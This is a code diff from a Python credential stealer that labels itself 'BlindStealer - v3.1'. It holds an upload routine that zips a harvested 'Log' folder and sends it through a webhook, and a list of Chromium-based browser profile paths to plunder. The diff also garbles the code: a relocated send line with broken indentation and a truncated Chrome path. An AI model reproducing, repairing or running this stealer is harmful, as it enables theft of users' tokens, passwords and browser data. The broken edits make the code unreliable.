@@ -67,7 +67,8 @@ class Upload:
             ),
             file=File("Log.zip"),
         )
-
+        
+            self.webhook.send(embed=embed, username="BlindStealer - v3.1", avatar_url="https://i.imgur.com/LNVOaxg.png")
     def clean(self):
         shutil.rmtree("Log")
         os.remove("Log.zip")
@@ -92,11 +93,6 @@ class Upload:
                 yield from self.tree(path, prefix=prefix+extension)
             else:
                 yield f"{prefix}{pointer}{midfix_file}{path.name} ({path.stat().st_size / 1024:.2f} kb)"
-    def upload(self):
-        if not self.tokens:
-            return
-
-            self.webhook.send(embed=embed, username="BlindStealer - v3.1", avatar_url="https://i.imgur.com/LNVOaxg.png")
 
 class Chromium:
     def __init__(self): 
@@ -110,7 +106,7 @@ class Chromium:
             '7star': self.appdata + '\\7Star\\7Star\\User Data',
             'sputnik': self.appdata + '\\Sputnik\\Sputnik\\User Data',
             'vivaldi': self.appdata + '\\Vivaldi\\User Data',
-            'google-chrome-sxs': self.appdata + '\\Google\\Chrome SxS\\User Data',
+            'google-chrome-sxs': self.appdata + '\\Google\\Chrome SxS\\User ',
             'google-chrome': self.appdata + '\\Google\\Chrome\\User Data',
             'epic-privacy-browser': self.appdata + '\\Epic Privacy Browser\\User Data',
             'microsoft-edge': self.appdata + '\\Microsoft\\Edge\\User Data',
